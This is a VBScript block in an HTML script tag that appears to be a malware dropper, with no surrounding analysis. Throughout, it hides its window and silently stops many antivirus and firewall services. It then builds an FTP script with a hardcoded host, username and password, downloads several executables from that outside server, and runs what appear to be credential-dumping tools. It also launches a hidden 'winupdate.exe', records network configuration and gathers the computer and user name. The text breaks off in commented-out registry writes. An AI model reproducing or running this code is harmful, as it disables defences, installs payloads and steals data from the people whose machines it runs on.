<script language="vbs">
self.MoveTo 5000,5000
public fso, aaa, bbb
Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")
function doo (xx)
aaa= WshShell.Run("cmd /c " & xx, 0, True)
end function
doo ("net stop "&chr(34)&"Kerio Personal Firewall"&chr(34))
doo ("net  stop "&chr(34)&"FW Configuration Interpreter"&chr(34)&" /y")
doo ("net stop "&chr(34)&"TrueVector Internet Monitor"&chr(34))
doo ("net stop "&chr(34)&"Norton AntiVirus Auto Protect Service"&chr(34))
doo ("net stop "&chr(34)&"Symantec Event Manager"&chr(34))
doo ("net stop "&chr(34)&"avsync manager"&chr(34))
doo ( "net stop "&chr(34)&"NaV alert"&chr(34))
doo ("net stop "&chr(34)&"nav auto-protect"&chr(34))
doo ("net stop "&chr(34)&"norton program scheduler"&chr(34))
doo ("net stop defwatch")
doo ("net stop "&chr(34)&"Norton AntiVirus Client"&chr(34))
doo ("net stop "&chr(34)&"AVG6 Service"&chr(34))
doo ("net stop "&chr(34)&"Trend NT Realtime Service"&chr(34))
doo ("net stop "&chr(34)&"AVSync Manager"&chr(34))
doo ("net stop McShield")
doo ("net stop "&chr(34)&"McAfee.com McShield"&chr(34))
doo ("net stop "&chr(34)&"Symantec AntiVirus Client"&chr(34))
doo ("net stop "&chr(34)&"McAfee.com VirusScan Online Realtime Engine"&chr(34))
doo ("net stop "&chr(34)&"PC-cillin PersonalFirewall"&chr(34))
doo ("net stop "&chr(34)&"Sophos Anti-Virus"&chr(34))
doo ("net stop "&chr(34)&"Sweep for Windows NT Update"&chr(34))
doo ("net stop "&chr(34)&"Sweep for Windows NT Network"&chr(34))
doo ("echo open ftp.trumanlawfirm.com >a")
doo ("echo office@trumanlawfirm.com>>a")
doo ("echo chinez99>>a")
doo ("echo bin>>a" )
doo ("echo cd web/cur>>a" )
doo ("echo get m.exe>>a" )
doo ("echo get mp.exe>>a" )
doo ("echo get dp.exe>>a" )
doo ("echo get top>>a" )
doo ("echo get butt>>a" )
doo ("echo get cucu.exe>>a" )
doo ("echo get cucu.dll>>a" )
'doo ("echo get winstart.vbs>>a" )
doo ("echo get winupdate.exe>>a" )
'doo ("echo get NTs.sys>>a")
'doo ("echo get hservice.exe>>a" )
doo ("echo bye>>a" )
doo ("ftp -s:a")
doo ("cucu 127.0.0.1 /o:syscom3a3" )
doo ("m /shtml syscom1a1" )
doo ("mp /shtml 2ver83re" )
doo ("dp /shtml yt45wax5" )
doo ("ipconfig /all > ipappa" )
'doo ("move NTs.sys drivers\")
bbb = WshShell.Run("winupdate.exe", 0, False)
Set WshNetwork = CreateObject("WScript.Network")
nu = WshNetwork.ComputerName & "_" & WshNetwork.UserName
nu=replace (nu," ","_")
'WshShell.RegWrite "HKLM\SYSTEM\CurrentControlSet\Services\NTs\ErrorControl",1 , "REG_DWORD"
'WshShell.RegWrite "HKLM\SYSTEM\CurrentControlSet\Services\NTs\Type", 1 ,"REG_